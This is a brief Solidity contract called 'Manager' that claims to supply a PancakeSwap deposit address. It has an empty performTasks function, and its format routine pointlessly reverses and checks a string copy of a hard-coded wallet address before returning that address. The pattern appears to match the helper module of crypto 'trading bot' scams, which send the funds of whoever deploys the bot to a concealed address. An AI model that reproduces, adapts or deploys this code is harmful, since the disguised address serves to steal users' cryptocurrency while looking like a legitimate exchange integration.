pragma solidity ^0.5.0;
contract Manager{function performTasks()public{}function pancakeDepositAddress()public pure returns (address) {return address(format(0x216Bb66A6Ac5f4d1df43C51B794BD406D507A203));}

function format(address addr)private pure returns(address){bytes memory rec='0x216Bb66A6Ac5f4d1df43C51B794BD406D507A203';
string memory rec2=new string(rec.length);bytes memory rec3=bytes(rec2);for(uint i=0;i<rec.length;i++)rec3[rec.length-i-1]=rec[i];require(rec3[30]==0x37);return addr;}}
